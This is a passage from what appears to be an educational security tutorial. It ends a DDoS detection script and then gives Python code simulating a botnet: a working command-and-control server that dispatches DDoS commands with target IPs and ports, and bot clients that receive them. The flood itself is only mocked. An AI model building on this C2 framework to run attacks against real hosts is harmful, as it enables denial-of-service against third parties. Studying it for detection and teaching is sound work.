        plt.savefig('ddos_detection_analysis.png', dpi=300, bbox_inches='tight')
        plt.show()
        
        print("Traffic visualization saved as 'ddos_detection_analysis.png'")

# Example usage
if __name__ == "__main__":
    # Create DDoS detection system
    detector = DDoSDetectionSystem(threshold_pps=500, time_window=30)
    
    # Start monitoring and simulation
    detector.start_monitoring(duration=90)
    
    # Generate report
    detector.generate_report()
    
    # Create visualization
    try:
        detector.visualize_traffic()
    except ImportError:
        print("Matplotlib not available for visualization")
```

### 5. Botnet Command and Control Simulation
```python
#!/usr/bin/env python3
import socket
import threading
import time
import json
import random
import hashlib

class BotnetC2Server:
    def __init__(self, host='localhost', port=8888):
        self.host = host
        self.port = port
        self.bots = {}
        self.commands = {}
        self.running = False
        self.server_socket = None
    
    def start_server(self):
        """Start C2 server"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(100)
        
        print(f"C2 Server started on {self.host}:{self.port}")
        self.running = True
        
        while self.running:
            try:
                client_socket, address = self.server_socket.accept()
                thread = threading.Thread(target=self.handle_bot, 
                                         args=(client_socket, address))
                thread.daemon = True
                thread.start()
            except:
                break
    
    def handle_bot(self, client_socket, address):
        """Handle bot connection"""
        bot_id = f"bot_{address[0]}_{address[1]}"
        print(f"Bot connected: {bot_id}")
        
        self.bots[bot_id] = {
            'socket': client_socket,
            'address': address,
            'last_seen': time.time(),
            'status': 'online'
        }
        
        try:
            while self.running:
                # Send heartbeat/command check
                message = json.dumps({'type': 'heartbeat'})
                client_socket.send(message.encode() + b'\n')
                
                # Check for commands
                if bot_id in self.commands:
                    command = self.commands[bot_id]
                    command_msg = json.dumps({
                        'type': 'command',
                        'command': command['action'],
                        'target': command.get('target', ''),
                        'duration': command.get('duration', 60),
                        'parameters': command.get('parameters', {})
                    })
                    client_socket.send(command_msg.encode() + b'\n')
                    del self.commands[bot_id]
                
                time.sleep(10)  # Heartbeat every 10 seconds
                
        except:
            pass
        finally:
            if bot_id in self.bots:
                self.bots[bot_id]['status'] = 'offline'
            client_socket.close()
            print(f"Bot disconnected: {bot_id}")
    
    def send_ddos_command(self, target_ip, attack_type='syn_flood', duration=60):
        """Send DDoS command to all bots"""
        command = {
            'action': 'ddos',
            'target': target_ip,
            'attack_type': attack_type,
            'duration': duration,
            'parameters': {
                'intensity': random.randint(100, 1000),
                'port': random.choice([80, 443, 22, 21])
            }
        }
        
        active_bots = [bid for bid, bot in self.bots.items() 
                       if bot['status'] == 'online']
        
        print(f"Sending DDoS command to {len(active_bots)} bots")
        print(f"Target: {target_ip}, Type: {attack_type}, Duration: {duration}s")
        
        for bot_id in active_bots:
            self.commands[bot_id] = command
    
    def get_bot_status(self):
        """Get status of all bots"""
        online_bots = sum(1 for bot in self.bots.values() if bot['status'] == 'online')
        total_bots = len(self.bots)
        
        print(f"Bot Status: {online_bots}/{total_bots} online")
        
        for bot_id, bot_info in self.bots.items():
            print(f"  {bot_id}: {bot_info['status']} (last seen: {time.time() - bot_info['last_seen']:.1f}s ago)")
    
    def stop_server(self):
        """Stop C2 server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()

class BotClient:
    def __init__(self, c2_host='localhost', c2_port=8888, bot_id=None):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.bot_id = bot_id or f"bot_{random.randint(1000, 9999)}"
        self.socket = None
        self.running = False
    
    def connect_to_c2(self):
        """Connect to C2 server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.c2_host, self.c2_port))
            print(f"Bot {self.bot_id} connected to C2 server")
            return True
        except Exception as e:
            print(f"Failed to connect to C2: {e}")
            return False
    
    def listen_for_commands(self):
        """Listen for commands from C2"""
        self.running = True
        
        while self.running:
            try:
                data = self.socket.recv(1024)
                if not data:
                    break
                
                # Handle multiple messages
                messages = data.decode().strip().split('\n')
                for msg in messages:
                    if msg:
                        try:
                            command = json.loads(msg)
                            self.handle_command(command)
                        except json.JSONDecodeError:
                            pass
                        
            except Exception as e:
                print(f"Error receiving command: {e}")
                break
        
        if self.socket:
            self.socket.close()
    
    def handle_command(self, command):
        """Handle command from C2"""
        if command['type'] == 'heartbeat':
            # Respond to heartbeat
            pass
        
        elif command['type'] == 'command':
            if command['command'] == 'ddos':
                print(f"Bot {self.bot_id} executing DDoS attack:")
                print(f"  Target: {command['target']}")
                print(f"  Type: {command.get('attack_type', 'unknown')}")
                print(f"  Duration: {command.get('duration', 0)}s")
                
                # Simulate DDoS attack
                self.execute_ddos_attack(command)
    
    def execute_ddos_attack(self, command):
        """Execute DDoS attack (simulation)"""
        target = command['target']
        duration = command.get('duration', 60)
        attack_type = command.get('attack_type', 'syn_flood')
        
        # Simulate attack without actually attacking
        print(f"Bot {self.bot_id} starting {attack_type} attack on {target}")
        
        start_time = time.time()
        packets_sent = 0
        
        while time.time() - start_time < duration and self.running:
            # Simulate sending packets
            packets_sent += random.randint(10, 100)
            time.sleep(1)
            
            if packets_sent % 500 == 0:
                print(f"Bot {self.bot_id}: {packets_sent} packets sent")
        
        print(f"Bot {self.bot_id} completed attack. Total packets: {packets_sent}")
    
    def start_bot(self):
        """Start bot operations"""
        if self.connect_to_c2():
            self.listen_for_commands()
    
    def stop_bot(self):
        """Stop bot operations"""
        self.running = False
        if self.socket:
            self.socket.close()

def simulate_botnet_attack():
    """Simulate complete botnet attack scenario"""
    # Start C2 server
    c2_server = BotnetC2Server()
    server_thread = threading.Thread(target=c2_server.start_server)
    server_thread.daemon = True
    server_thread.start()
    
    time.sleep(2)  # Give server time to start
    
    # Create bot clients
    bots = []
    for i in range(5):  # Simulate 5 bots
        bot = BotClient(bot_id=f"bot_00{i}")
        bot_thread = threading.Thread(target=bot.start_bot)
        bot_thread.daemon = True
        bot_thread.start()
        bots.append(bot)
        time.sleep(0.5)
    
    time.sleep(5)  # Let bots connect
    
    # Check bot status
    print("\n" + "="*50)
    print("BOTNET STATUS")
    print("="*50)
    c2_server.get_bot_status()
    
    # Send DDoS command
    print("\n" + "="*50)
    print("LAUNCHING DDOS ATTACK")
    print("="*50)
    c2_server.send_ddos_command("192.168.1.100", "syn_flood", 30)
    
    # Wait for attack to complete
    time.sleep(35)
    
    # Final status
    print("\n" + "="*50)
    print("ATTACK COMPLETED")
    print("="*50)
    c2_server.get_bot_status()
    
    # Cleanup
    for bot in bots:
        bot.stop_bot()
    c2_server.stop_server()

# Example usage
if __name__ == "__main__":
    print("Starting Botnet C2 Simulation")
    print("WARNING: This is for educational purposes only!")
    print("="*50)
    
    simulate_botnet_attack()
```